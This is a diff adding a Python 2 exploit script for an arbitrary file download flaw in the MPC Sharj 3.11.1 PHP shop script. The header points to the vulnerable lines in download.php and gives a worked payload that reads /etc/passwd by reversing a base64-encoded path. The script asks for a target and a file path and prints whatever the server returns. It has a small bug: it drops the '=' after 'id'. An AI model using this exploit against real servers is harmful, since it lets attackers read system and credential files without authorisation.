@@ -1,0 +1,69 @@
+# Exploit title : MPC Sharj 3.11.1 - Arbitrary File Download
+# Exploit Author : SajjadBnd
+# Date : 2020-05-02
+# Software Link : http://dl.nuller.ir/mpc-sharj-vr_3.11.1_beta[www.nuller.ir].zip
+# Tested on : Ubuntu 19.10
+# Version : 3.11.1 Beta
+############################
+#
+# [ DESCRIPTION ]
+#
+# MPC Sharj is a free open source script for creating sim card credit card's shop.
+#
+# [POC]
+#
+# Vulnerable file: download.php
+# parameter : GET/ "id"
+# 69: readfile readfile($file);
+# 55: $file = urldecode(base64_decode(strrev($file)));
+# 53: $file = trim(strip_tags($_GET['id']));
+#
+# payload : [
+# Steps:
+#
+# 1. convert your payload (/etc/passwd) to base64 (L2V0Yy9wYXNzd2Q=)
+# 2. convert base64 result (L2V0Yy9wYXNzd2Q=) to strrev (=Q2dzNXYw9yY0V2L)
+# 3. your payload is ready ;D
+# http://localhost/download.php?id==Q2dzNXYw9yY0V2L
+#
+#]
+#
+
+import requests
+import os
+from base64 import b64encode
+
+def clear():
+linux = 'clear'
+windows = 'cls'
+os.system([linux, windows][os.name == 'nt'])
+
+def banner():
+print '''
+##############################################################
+##############################################################
+#### # ######### # #### ######### #####
+#### ### ###### ## #### ###### #### ############# #####
+#### #### #### ### #### ###### #### ###################
+#### ##### ## #### #### ####### ###################
+#### ###### ##### #### ############ ###################
+#### ############### #### ############ ############# #####
+#### ############### #### ##666######### ######
+##############################################################
+##############################################################
+###### MPC Sharj 3.11.1 Beta - Arbitrary File Download #####
+##############################################################
+'''
+
+def exploit():
+target = raw_input('[+] Target(http://example.com) => ')
+read_file = raw_input('[+] File to Read => ')
+read_file = b64encode(read_file)
+target = target+"/download.php?id"+read_file[::-1]
+r = requests.get(target,timeout=500)
+print "\n"+r.text
+
+if __name__ == '__main__':
+clear()
+banner()
+exploit()
